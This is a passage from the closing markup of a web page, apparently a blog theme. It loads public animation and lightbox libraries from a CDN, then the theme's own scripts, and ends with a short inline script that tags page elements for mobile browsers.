src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>